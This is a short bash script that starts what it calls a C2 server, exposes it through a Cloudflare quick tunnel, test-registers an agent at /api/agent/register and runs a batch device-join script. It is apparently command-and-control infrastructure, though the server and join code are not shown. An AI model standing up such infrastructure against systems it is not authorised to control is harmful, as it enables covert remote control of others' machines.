#!/bin/bash
# Start C2 server, wait for tunnel, run batch join
cd "$(dirname "$0")"
PORT=${1:-8444}

echo "[1] Starting C2 server on port $PORT..."
pkill -f "python3 server.py" 2>/dev/null
pkill -f "cloudflared tunnel" 2>/dev/null
sleep 2

nohup python3 server.py --port "$PORT" > /tmp/c2_server.log 2>&1 &
SERVER_PID=$!
echo "    Server PID: $SERVER_PID"

echo "[2] Waiting for tunnel URL (up to 30s)..."
for i in {1..30}; do
  sleep 1
  URL=$(sqlite3 data/c2.db "SELECT value FROM config WHERE key='public_url';" 2>/dev/null)
  if [[ -n "$URL" && "$URL" == https://*.trycloudflare.com ]]; then
    echo "    Tunnel: $URL"
    break
  fi
  [[ $i -eq 30 ]] && echo "    WARNING: No tunnel URL yet"
done

echo "[3] Testing tunnel..."
curl -sk -o /dev/null -w "%{http_code}" -X POST "${URL:-https://test.com}/api/agent/register" \
  -H "Content-Type: application/json" -d '{"hostname":"test"}' | grep -q 200 && echo "    OK" || echo "    Check $URL"

echo "[4] Running batch join..."
python3 run_batch_join.py 2>&1 | tee /tmp/batch_join.log

echo ""
echo "Done. Check Devices at https://127.0.0.1:$PORT/devices"
